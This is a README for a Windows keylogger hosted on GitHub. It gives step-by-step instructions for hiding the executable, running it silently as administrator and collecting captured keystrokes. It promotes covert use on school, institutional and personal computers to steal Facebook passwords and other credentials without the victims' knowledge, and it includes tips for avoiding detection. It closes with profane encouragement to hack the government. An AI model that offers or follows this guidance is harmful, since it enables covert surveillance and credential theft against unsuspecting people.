## Instructions

- Step 1
  - Download the [Windows Keylogger](https://github.com/jcristdorhen/windows-keylogger) by [Orhen-Rx1](https://orhenai.vercel.app).
- Step 2
  - Place the Windows keylogger executable file in a location that is not easily accessible to the user.
- Step 3
  - Run the Windows keylogger executable as an `administrator`. This will ensure it activates automatically and silently, preventing the user from detecting its operation.
- Step 4
  - You can then review the captured keystrokes in `keystrokes.txt`. The keylogger is running.
- Step 5
  - To exit or deactivate the keylogger, simply press the "Esc" key on the keyboard.

## Attack

This `Windows Keylogger` captures user keystrokes, making it effective for obtaining Facebook passwords and other account credentials. It requires manual deployment, making it suitable for use on public computers in settings like schools, institutions, or personal laptops, without the user's knowledge. The `keylogger` operates in `stealth mode`, remaining hidden from services and background processes. It is crucial to remember when the keylogger is `active`. Terminate the `keylogger` by pressing the `Esc` key; this can be disguised as an accidental keypress. Ensure the keylogger is placed in an obscure folder to `avoid detection`. While this method is effective, exercise caution, as modern users may possess a certain level of technical awareness. Enjoy the show. Cheers! 🥂

## Contributions

This repository is `open` for `contributions`. Feel free to `test`, `run`, and `contribute` to the project. Unauthorized copying is discouraged, as `GitHub's plagiarism detection` will lead to the `removal` of `copied content`. Show respect to the original creator. BITCH!

## Licensing

This keylogger has no license, meaning it's free to use, and have fun. Improve or enhance this shit all you want. But have fun, and fuck this shit up! Fuck the government, and let's have fun exploiting and hacking them bitch!
